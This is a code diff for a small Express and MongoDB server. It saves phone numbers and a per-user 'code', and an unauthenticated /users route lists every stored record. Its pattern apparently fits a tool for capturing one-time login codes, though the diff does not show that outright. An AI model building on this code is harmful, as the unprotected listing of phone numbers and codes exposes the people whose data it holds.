@@ -7,12 +7,10 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// اتصال به MongoDB
 mongoose.connect(process.env.MONGO_URL)
   .then(() => console.log("MongoDB Connected"))
   .catch(err => console.log(err));
 
-// مدل کاربر
 const UserSchema = new mongoose.Schema({
   phone: String,
   code: String
@@ -20,7 +18,6 @@ const UserSchema = new mongoose.Schema({
 
 const User = mongoose.model("User", UserSchema);
 
-// ذخیره شماره
 app.post("/phone", async (req, res) => {
   const { phone } = req.body;
 
@@ -32,26 +29,19 @@ app.post("/phone", async (req, res) => {
   res.json({ id: user._id });
 });
 
-// ذخیره کد
 app.put("/code/:id", async (req, res) => {
   const { id } = req.params;
   const { code } = req.body;
 
-  const user = await User.findById(id);
-
-  if (!user) {
-    return res.status(404).json({ error: "not found" });
-  }
-
-  user.code = code;
-  await user.save();
+  await User.findByIdAndUpdate(id, {
+    code
+  });
 
   res.json({ ok: true });
 });
 
-// دیدن همه کاربران (ادمین)
 app.get("/users", async (req, res) => {
-  const users = await User.find();
+  const users = await User.find().sort({ _id: -1 });
   res.json(users);
 });
 
